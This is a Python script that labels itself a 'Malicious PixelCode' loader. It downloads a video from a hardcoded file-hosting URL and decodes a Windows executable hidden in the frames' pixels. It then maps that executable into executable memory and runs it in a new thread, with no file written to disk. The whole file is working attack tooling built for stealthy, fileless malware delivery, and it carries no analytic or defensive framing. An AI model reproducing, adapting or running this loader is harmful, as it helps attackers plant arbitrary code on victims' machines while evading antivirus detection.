#!/usr/bin/env python3
"""
Malicious PixelCode - Complete Python Loader with Embedded URL
- Downloads video from hardcoded URL
- Extracts payload via pixel decoding
- Maps and executes payload in memory (fileless)
"""

import cv2
import numpy as np
from PIL import Image
import ctypes
import sys
import os
import tempfile
import requests
from tqdm import tqdm
import pefile

# ===================== CONFIGURATION =====================
# Hardcode your video URL here (direct link to the PixelCode video)
VIDEO_URL = "https://storage.filebin.net/filebin/ce6b2f918801801858834817bdb14b284e37170dcc168bfb83941ea065afbf9a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=GK352fd2505074fc9dde7fd2cb%2F20260226%2Fhel1-dc4%2Fs3%2Faws4_request&X-Amz-Date=20260226T045351Z&X-Amz-Expires=900&X-Amz-SignedHeaders=host&response-cache-control=max-age%3D900&response-content-disposition=inline%3B%20filename%3D%22Pixel_Code_Video.mp4%22&response-content-type=video%2Fmp4&x-id=GetObject&X-Amz-Signature=376c88c48b109ba50cf8e3c56526432dd72687845faacc73b6765e2487934827"

# Pixel decoding parameters (match the encoding settings)
PIXEL_SIZE           = 4
WHITE_IS_ZERO        = True
BRIGHTNESS_THRESHOLD = 180

# Execution control
EXECUTE_PAYLOAD      = True   # Set to False to only extract and map (debug)
SAVE_PAYLOAD         = False  # Save extracted PE to disk for analysis
# ==========================================================

def download_video(url):
    """Download video from URL to a temporary file and return the file path."""
    print(f"[*] Downloading video from: {url}")
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))

        # Create a temporary file (auto-deleted on close, but we'll manage manually)
        fd, temp_path = tempfile.mkstemp(suffix='.mp4')
        os.close(fd)

        with open(temp_path, 'wb') as f:
            with tqdm(total=total_size, unit='B', unit_scale=True, desc="Downloading") as pbar:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
                    pbar.update(len(chunk))
        print(f"[+] Video downloaded to temporary file: {temp_path}")
        return temp_path
    except Exception as e:
        print(f"[!] Download failed: {e}")
        return None

def extract_payload(video_path):
    """Extract hidden PE from video using pixel decoding."""
    if not os.path.isfile(video_path):
        print(f"[!] Video file not found: {video_path}")
        return None

    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        print("[!] Cannot open video")
        return None

    w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    fc = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
    print(f"[i] Video: {w}×{h}   {fc} frames")

    cols = w // PIXEL_SIZE
    rows = h // PIXEL_SIZE
    bits = []

    with tqdm(total=fc, desc="Reading frames", unit="frame") as pbar:
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)

            for r in range(rows):
                for c in range(cols):
                    cx = c * PIXEL_SIZE + PIXEL_SIZE // 2
                    cy = r * PIXEL_SIZE + PIXEL_SIZE // 2
                    if cx >= w or cy >= h:
                        continue
                    rv, gv, bv = img.getpixel((cx, cy))
                    bright = (rv + gv + bv) // 3
                    # Determine bit based on brightness
                    if WHITE_IS_ZERO:
                        bit = 0 if bright > BRIGHTNESS_THRESHOLD else 1
                    else:
                        bit = 1 if bright > BRIGHTNESS_THRESHOLD else 0
                    bits.append(bit)
            pbar.update(1)
    cap.release()

    if not bits:
        print("[!] No bits extracted")
        return None

    print(f"[i] Collected {len(bits):,} bits")
    # Convert bits to bytes
    payload = bytearray()
    for i in range(0, len(bits) - len(bits) % 8, 8):
        b = 0
        for j in range(8):
            b = (b << 1) | bits[i + j]
        payload.append(b)
    print(f"[+] Reconstructed payload: {len(payload):,} bytes")
    return bytes(payload)

def map_and_run_pe(raw_pe):
    """Manually map PE into memory and optionally execute its entry point."""
    if sys.platform != "win32":
        print("[!] This code requires Windows")
        return

    if SAVE_PAYLOAD:
        with open("extracted_payload.exe", "wb") as f:
            f.write(raw_pe)
        print("[+] Payload saved to extracted_payload.exe")

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    kernel32.VirtualProtect.restype = ctypes.c_bool
    kernel32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    kernel32.LoadLibraryA.restype = ctypes.c_void_p
    kernel32.LoadLibraryA.argtypes = [ctypes.c_char_p]
    kernel32.GetProcAddress.restype = ctypes.c_void_p
    kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    kernel32.CreateThread.restype = ctypes.c_void_p
    kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p,
                                      ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    kernel32.WaitForSingleObject.restype = ctypes.c_ulong
    kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
    kernel32.VirtualFree.restype = ctypes.c_int
    kernel32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]

    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_RELEASE = 0x8000

    try:
        pe = pefile.PE(data=raw_pe)
    except Exception as e:
        print(f"[!] PE parsing failed: {e}")
        return

    is_64bit = pe.FILE_HEADER.Machine == 0x8664
    print(f"[i] PE architecture: {'64-bit' if is_64bit else '32-bit'}")
    image_base = pe.OPTIONAL_HEADER.ImageBase
    image_size = pe.OPTIONAL_HEADER.SizeOfImage
    print(f"[i] ImageBase: 0x{image_base:X}   SizeOfImage: {image_size:,}")

    base_addr = kernel32.VirtualAlloc(None, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not base_addr:
        print(f"[!] VirtualAlloc failed (err {ctypes.get_last_error()})")
        return
    print(f"[+] Allocated at 0x{base_addr:X}")

    # Copy headers and sections
    ctypes.memmove(base_addr, raw_pe, pe.OPTIONAL_HEADER.SizeOfHeaders)
    for sec in pe.sections:
        dest = base_addr + sec.VirtualAddress
        src_data = raw_pe[sec.PointerToRawData : sec.PointerToRawData + sec.SizeOfRawData]
        ctypes.memmove(dest, src_data, len(src_data))

    # Relocations
    delta = base_addr - image_base
    if delta != 0:
        print("[i] Relocating image")
        reloc_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_BASERELOC']]
        if reloc_dir.Size:
            offset = 0
            data = pe.get_data(reloc_dir.VirtualAddress, reloc_dir.Size)
            while offset < len(data):
                block_rva = int.from_bytes(data[offset:offset+4], "little")
                block_size = int.from_bytes(data[offset+4:offset+8], "little")
                offset += 8
                if block_rva == 0:
                    break
                for i in range(0, block_size - 8, 2):
                    entry = int.from_bytes(data[offset:offset+2], "little")
                    offset += 2
                    rtype = entry >> 12
                    roff = entry & 0xFFF
                    addr = base_addr + block_rva + roff
                    if rtype == 10 and is_64bit:      # DIR64
                        val = int.from_bytes(ctypes.string_at(addr, 8), "little") + delta
                        ctypes.memmove(addr, val.to_bytes(8, "little"), 8)
                    elif rtype == 3 and not is_64bit: # HIGHLOW
                        val = int.from_bytes(ctypes.string_at(addr, 4), "little") + delta
                        ctypes.memmove(addr, val.to_bytes(4, "little"), 4)

    # Imports
    print("[i] Resolving imports")
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            dll_name = entry.dll.decode() if isinstance(entry.dll, bytes) else entry.dll
            dll = kernel32.LoadLibraryA(dll_name.encode())
            if not dll:
                print(f"[!] LoadLibraryA failed for {dll_name}")
                kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
                return
            for imp in entry.imports:
                if imp.name:
                    func_name = imp.name.decode() if isinstance(imp.name, bytes) else imp.name
                    func = kernel32.GetProcAddress(dll, func_name.encode())
                    if not func:
                        print(f"[!] GetProcAddress failed: {func_name}")
                        kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
                        return
                    iat_addr = base_addr + imp.address - image_base
                    if is_64bit:
                        ctypes.memmove(iat_addr, ctypes.c_void_p(func).value.to_bytes(8, "little"), 8)
                    else:
                        ctypes.memmove(iat_addr, ctypes.c_void_p(func).value.to_bytes(4, "little"), 4)

    # TLS callbacks (simplified)
    tls_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_TLS']]
    if tls_dir.Size:
        try:
            tls = pe.parse_directory_tls(tls_dir.VirtualAddress)
            if tls and tls.callbacks:
                print(f"[i] Found {len(tls.callbacks)} TLS callbacks")
                for cb_rva in tls.callbacks:
                    cb_addr = base_addr + cb_rva - image_base
                    print(f"  → Calling TLS callback at 0x{cb_addr:X}")
                    callback = ctypes.CFUNCTYPE(None)(cb_addr)
                    callback()
        except Exception as e:
            print(f"[!] TLS error: {e}")

    entry_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    entry_addr = base_addr + entry_rva
    print(f"[+] Entry point: 0x{entry_addr:X}")

    if not EXECUTE_PAYLOAD:
        print("\n[DEBUG] Execution skipped. Memory mapped at 0x{base_addr:X}")
        input("Press Enter to free memory and exit...")
        kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
        return

    # Create thread at entry point
    tid = ctypes.c_ulong(0)
    h_thread = kernel32.CreateThread(None, 0, entry_addr, None, 0, ctypes.byref(tid))
    if not h_thread:
        print(f"[!] CreateThread failed (err {ctypes.get_last_error()})")
        kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)
        return

    print(f"[+] Thread started (TID {tid.value}) → waiting...")
    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
    print("[+] Thread finished")
    kernel32.VirtualFree(base_addr, 0, MEM_RELEASE)

def main():
    print("Malicious PixelCode - Embedded URL Loader")
    print("=" * 60)
    print(f"[*] Using hardcoded URL:\n{VIDEO_URL}\n")

    # Step 1: Download video to temp file
    video_path = download_video(VIDEO_URL)
    if not video_path:
        sys.exit(1)

    # Step 2: Extract payload
    payload = extract_payload(video_path)

    # Step 3: Clean up temp video
    try:
        os.unlink(video_path)
        print(f"[i] Temporary video deleted")
    except:
        pass

    if not payload:
        print("[!] Extraction failed")
        sys.exit(1)

    # Step 4: Map and execute payload
    print("\n[*] Starting manual mapping...")
    map_and_run_pe(payload)
    print("\n[+] All done.")

if __name__ == "__main__":
    main()
